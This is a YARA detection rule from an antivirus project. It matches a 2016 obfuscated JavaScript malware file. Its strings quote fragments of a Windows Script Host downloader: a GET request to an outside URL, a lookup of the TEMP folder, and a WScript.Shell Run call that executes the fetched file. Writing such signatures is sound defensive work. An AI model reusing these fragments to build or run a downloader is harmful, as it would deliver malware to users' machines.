rule sig_20160427_b5fe6486d2ba9aa43bdc42e52d901d87 {
  meta:
    description = "datamaliciousorder - file 20160427_b5fe6486d2ba9aa43bdc42e52d901d87.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "206affe254b7c6fc5c4ed51538b9a99332153ef829cbc0d6632ff9fa0b1ca9a8"

  strings:
    $s1  = "XsxgzCrcxl[CfycyDcroi](\"G\" + \"ET\", \"http://haraccountants.co.uk/k9sjf\", false);" fullword ascii
    $s2  = "function QaqhbAkabe() {return ZapqbLnbnn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tZnxIw4" ascii
    $s3  = "function QaqhbAkabe() {return ZapqbLnbnn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tZnxIw4" ascii
    $s4  = "function LrrqvIiqsz(GknawHfajy, EyqpqQnsnc){EtutqNgacp = EtutqNgacp * 1; return GknawHfajy - EyqpqQnsnc;};" fullword ascii
    $s5  = "var ZapqbLnbnn = function WnylmWjmlm() {return VsgnyNuzrd[NiizgPpkhq](\"WScript\"+\".Shell\");}(), ZpfukJmjkd = 11;" fullword ascii
    $s6  = "var VsgnyNuzrd = this[\"WScript\"];" fullword ascii
    $s7  = "function ProajDwuon(){return RyulpUtfkm + \"\";};" fullword ascii
    $s8  = "if (XsxgzCrcxl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function MxnpjOknrb() {return ((RndezMocjf == true) && (RndezMocjf == QwuovHvzlq)) ? 1 : EtutqNgacp;};" fullword ascii
    $s10 = "function SczesYggwh()" fullword ascii
    $s11 = "GdvfiCkhok = true;" fullword ascii
    $s12 = "function PkvdnPgecv(){return 23;};" fullword ascii
    $s13 = "}while (MixxzAlvrt);" fullword ascii
    $s14 = "QwuovHvzlq = true; " fullword ascii
    $s15 = "function VlpuuCnncg(MlqmcZkdoc){ZapqbLnbnn[\"R\"+\"un\"](MlqmcZkdoc, EtutqNgacp, EtutqNgacp);};" fullword ascii
    $s16 = "function AegtsUqnbo(){return NiizgPpkhq;};" fullword ascii
    $s17 = "var AcgklXuvmo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var RndezMocjf = false;" fullword ascii
    $s19 = "var GdvfiCkhok = false;" fullword ascii
    $s20 = "var QwuovHvzlq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}